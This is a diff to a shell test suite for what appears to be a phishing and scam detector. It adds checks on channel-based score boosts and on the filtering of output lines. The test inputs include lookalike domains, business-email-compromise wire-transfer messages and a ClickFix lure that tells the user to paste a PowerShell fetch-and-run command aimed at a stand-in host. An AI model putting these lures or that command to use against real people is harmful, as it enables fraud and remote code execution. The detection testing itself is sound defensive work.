@@ -1312,10 +1312,32 @@ FROM_MAN_OUT=$(./hlse_core --from manual "https://paypa1.com/login" 2>/dev/null)
 echo "$FROM_MAN_OUT" | grep -q "Channel" && check "--from manual: no channel reason" "0" "1" \
     || check "--from manual: no channel reason" "0" "0"
 
-# --from does NOT affect text (only URLs get the channel prior)
-FROM_TEXT_OUT=$(./hlse_core --from sms text "URGENT wire transfer now" 2>/dev/null) || true
-echo "$FROM_TEXT_OUT" | grep -q "Channel" && check "--from ignored for text input" "0" "1" \
-    || check "--from ignored for text input" "0" "0"
+# --from DOES affect text: channel prior is delivery-channel risk, not content-type risk
+# p37: sms channel lifts a text LOG score to ALERT [score+15], shows Channel reason line
+FROM_TEXT_OUT=$(./hlse_core --from sms text "Your account needs verification. Verify immediately or access will be suspended." 2>/dev/null) || true
+echo "$FROM_TEXT_OUT" | grep -q "Channel (sms)" \
+    && check "p37: --from sms applies channel prior to text verdicts" "0" "0" \
+    || check "p37: --from sms applies channel prior to text verdicts" "0" "1"
+
+# p37: channel delta raises effective score (LOG+15 = ALERT, shown in header)
+echo "$FROM_TEXT_OUT" | grep -q "ALERT\s*\[40\]" \
+    && check "p37: --from sms elevates LOG text to ALERT in display" "0" "0" \
+    || check "p37: --from sms elevates LOG text to ALERT in display" "0" "1"
+
+# p37: JSON includes channel fields for text verdicts
+./hlse_core --json --from email text "URGENT wire transfer required immediately. CEO request." 2>/dev/null \
+    | python3 -c '
+import sys, json
+d = json.loads(sys.stdin.read())
+assert d.get("channel") == "email", d
+assert d.get("channel_delta") == 10, d
+assert d.get("effective_score","") >= 60, d
+' && check "p37 json: text verdict includes channel/channel_delta/effective_score" "0" "0" \
+   || check "p37 json: text verdict includes channel/channel_delta/effective_score" "0" "1"
+
+# p37: email+channel raises BEC from raw-58 to effective 68 → exit 1 (BLOCK)
+FC=0; ./hlse_core --from email text "URGENT wire transfer required immediately. CEO request." >/dev/null 2>&1 || FC=$?
+check "p37: --from email text BLOCK exits 1" "1" "$FC"
 
 # --from with invalid channel exits 2
 FC=0; ./hlse_core --from fax "https://paypa1.com" >/dev/null 2>&1 || FC=$?
@@ -2085,6 +2107,37 @@ assert d.get("canonical_brand") == "paypal", d
     | grep -qi "log in\|service directly\|bookmark\|security notice" \
     && check "p34: fake security alert shows account-suspension exoneration" "0" "0" \
     || check "p34: fake security alert shows account-suspension exoneration" "0" "1"
+
+# ─── Perspective 36: Amplifier lines filtered from human-readable output ──────
+# Amplifiers are derived meta-labels (kept in JSON reasons); the ▸ Pattern line
+# already expresses them. They must NOT appear in the · reason list.
+./hlse_core text "URGENT: CEO needs immediate wire transfer of 50000. Do not discuss with anyone." 2>/dev/null \
+    | grep -v "^  ▸" \
+    | grep -qv "Amplifier:" \
+    && check "p36: BEC text hides Amplifier lines from · reason list" "0" "0" \
+    || check "p36: BEC text hides Amplifier lines from · reason list" "0" "1"
+
+./hlse_core text "Verify you are human: press Win+R and paste iex(iwr 'check.example.com/fix.ps1')" 2>/dev/null \
+    | grep -qv "Amplifier:" \
+    && check "p36: ClickFix text hides Amplifier lines from · reason list" "0" "0" \
+    || check "p36: ClickFix text hides Amplifier lines from · reason list" "0" "1"
+
+# Amplifiers MUST still appear in --json reasons array (for integrators)
+./hlse_core --json text "URGENT: CEO needs immediate wire transfer of 50000. Do not discuss with anyone." 2>/dev/null \
+    | python3 -c '
+import sys, json
+d = json.loads(sys.stdin.read())
+amps = [r for r in d["reasons"] if r.startswith("Amplifier:")]
+assert len(amps) >= 1, "no amplifiers in JSON reasons"
+' && check "p36 json: Amplifier lines preserved in JSON reasons array" "0" "0" \
+   || check "p36 json: Amplifier lines preserved in JSON reasons array" "0" "1"
+
+# stdin path also filters Amplifiers
+printf '%s\n' "URGENT: CEO needs immediate wire transfer of 50000. Do not discuss with anyone." \
+    | ./hlse_core --stdin 2>/dev/null \
+    | grep -qv "Amplifier:" \
+    && check "p36: --stdin path also filters Amplifier lines" "0" "0" \
+    || check "p36: --stdin path also filters Amplifier lines" "0" "1"
 
 # ─── Perspective 35: text advisory output centralisation (cross-path parity) ──
 # The text-subcommand, --stdin, and default auto-detect paths must emit the
